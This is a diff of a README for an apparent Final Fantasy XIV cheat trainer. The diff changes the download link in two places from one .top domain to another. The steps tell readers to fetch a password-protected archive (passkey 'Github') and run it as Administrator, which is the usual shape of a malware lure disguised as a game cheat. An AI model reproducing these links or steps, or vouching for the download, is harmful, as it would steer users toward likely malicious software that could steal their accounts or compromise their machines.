@@ -6,7 +6,7 @@ Final Fantasy XIV trainer with gil, level, gear, and combat cheats for the MMO. 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -74,7 +74,7 @@ Based on popular mods like **FFXIVQuickLauncher**, **Dalamud**, and **ACT**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Final Fantasy XIV.
 4. Run the trainer **as Administrator**.
